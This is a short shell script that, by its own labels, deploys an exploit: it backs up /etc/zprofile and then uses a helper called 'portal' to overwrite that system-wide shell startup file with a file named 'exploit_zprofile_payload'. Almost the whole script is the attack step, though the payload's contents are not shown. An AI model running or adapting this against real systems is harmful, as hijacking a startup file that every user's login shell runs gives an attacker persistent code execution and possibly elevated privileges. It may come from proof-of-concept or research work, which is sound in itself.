#!/bin/sh

BACKUP_NAME='exploit_zprofile.backup'

if [ -f "./$BACKUP_NAME" ]; then
  echo "[INFO] skipping backup since backup already exist"
else
  cp /etc/zprofile ./$BACKUP_NAME
  echo "[INFO] backup created at ./$BACKUP_NAME"
fi

echo "[INFO] deploying payload"
./portal write /etc/zprofile ./exploit_zprofile_payload
echo "[INFO] payload deployed"
